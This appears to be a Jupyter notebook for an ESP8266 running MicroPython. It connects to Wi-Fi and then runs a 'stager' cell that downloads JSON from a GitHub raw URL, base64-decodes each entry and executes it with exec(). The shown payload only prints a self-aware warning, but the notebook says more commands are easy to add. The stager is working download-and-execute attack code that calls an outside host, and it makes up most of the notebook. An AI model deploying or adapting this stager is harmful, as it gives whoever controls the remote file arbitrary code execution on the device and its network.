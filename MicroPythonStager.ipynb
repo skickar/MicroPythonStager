{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[34mConnecting to --port=/dev/cu.wchusbserial14630 --baud=115200 \u001b[0m\n",
      "\u001b[34mReady.\n",
      "\u001b[0m"
     ]
    }
   ],
   "source": [
    "# Connect to ESP8266 via serial\n",
    "\n",
    "%serialconnect to --port=/dev/cu.wchusbserial14630 --baud=115200"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ".('192.168.43.82', '255.255.255.0', '192.168.43.1', '192.168.43.1')\n",
      "5\n",
      "Connection is  True\n",
      "Wi-Fi Connected\n"
     ]
    }
   ],
   "source": [
    "# Connect to Wi-Fi network, define SSID and Password\n",
    "# Here, you need to define the Wi-Fi SSID, Password, and Payload URL\n",
    "\n",
    "import network\n",
    "from time import sleep\n",
    "\n",
    "ssid = \"PCC_Campus\"\n",
    "password = \"\"\n",
    "payloadURL = \"https://raw.githubusercontent.com/skickar/Research/master/twitter0.json\"\n",
    "\n",
    "def connectWifi(ssid, password):\n",
    "    sta = network.WLAN(network.STA_IF)\n",
    "    sta.active(True)\n",
    "    sta.connect(ssid, password)\n",
    "    sleep(2)\n",
    "    print(sta.ifconfig())\n",
    "    print(sta.status())\n",
    "    print(\"Connection is \", sta.isconnected())\n",
    "    if sta.isconnected() != False:\n",
    "        print(\"Wi-Fi Connected\")\n",
    "    else: \n",
    "        print(\"Trying again ...\")\n",
    "        print(sta.isconnected(), ssid, password)\n",
    "        sleep(3)\n",
    "        connectWifi(ssid, password)\n",
    "\n",
    "connectWifi(ssid, password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "You should NEVER just let some random Python program Exec code on your system!?!?!\n",
      "Are you fucking crazy???\n",
      "But while you're here, how does this script work? Well, it's stupid, and great\n",
      "What it does is request some JSON data from Github, which is loaded with base46 strings\n",
      "This code takes that JSON object and decodes the base64 strings, which are actually Python commands\n",
      "Then, it blindly executes them on your soft, vulnerable system. It does this for however many commands you want.\n",
      "Fortunately, this payload is just print statements, but because the JSON keys are organized to add as many as you want, it's easy to add commands.\n"
     ]
    }
   ],
   "source": [
    "# Stager, downloads and executes payloads\n",
    "import ubinascii, json, urequests, sys\n",
    "if payloadURL == False: print(\"Provide payload URL, re-run the last cell\"), sys.exit()\n",
    "r = urequests.get(payloadURL).json()\n",
    "for i in range (1, (len(r)+1)):\n",
    "    rawCommand = r[\"m{}\".format(i)]\n",
    "    exec((ubinascii.a2b_base64(rawCommand)).decode('utf-8'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "MicroPython - USB",
   "language": "micropython",
   "name": "micropython"
  },
  "language_info": {
   "codemirror_mode": "python",
   "file_extension": ".py",
   "mimetype": "text/python",
   "name": "micropython"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
